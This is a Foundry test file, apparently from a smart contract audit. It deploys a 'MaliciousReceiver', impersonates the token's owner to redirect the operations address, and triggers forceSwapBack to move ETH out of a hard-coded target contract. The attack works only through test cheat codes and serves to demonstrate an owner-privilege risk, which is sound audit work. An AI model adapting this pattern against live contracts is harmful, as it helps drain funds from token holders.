// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface FoundationToken_Comprehensive_Smart_Contract_Audit {
    function owner() external view returns (address);
    function setOperationsAddress(address _operationsAddress) external;
    function enableTrading() external;
    function forceSwapBack() external;
    function swapTokensAtAmount() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract MaliciousReceiver {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x9c771503a42f9b6e498d89c43e99F2e58CB8B384;
    address attacker = address(this);
    MaliciousReceiver public maliciousReceiver;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Deploy malicious receiver contract
        maliciousReceiver = new MaliciousReceiver();

        // Get the current owner of the target contract
        address currentOwner = FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).owner();

        // Impersonate the owner to perform privileged actions
        vm.startPrank(currentOwner);

        // Set operations address to our malicious receiver
        FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).setOperationsAddress(address(maliciousReceiver));

        // Enable trading if not already enabled (needed for swapBack to work)
        FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).enableTrading();

        // Stop impersonating
        vm.stopPrank();

        // Send some ETH to the target contract so it has balance to steal
        deal(TARGET, 10 ether);

        // We also need to ensure the contract has enough tokens to trigger swapBack
        // Get some tokens from the owner (who has all supply) and transfer to contract
        vm.prank(currentOwner);
        FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).transfer(TARGET, FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).swapTokensAtAmount());
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance of attacker
        uint256 initialBalance = address(this).balance;

        // Trigger the swapBack via forceSwapBack()
        // First need to impersonate owner again to call forceSwapBack
        address currentOwner = FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).owner();
        vm.prank(currentOwner);
        FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).forceSwapBack();

        // Now the ETH should be in our malicious receiver
        // Withdraw from malicious receiver to attacker
        maliciousReceiver.withdraw();

        // Verify we gained ETH
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

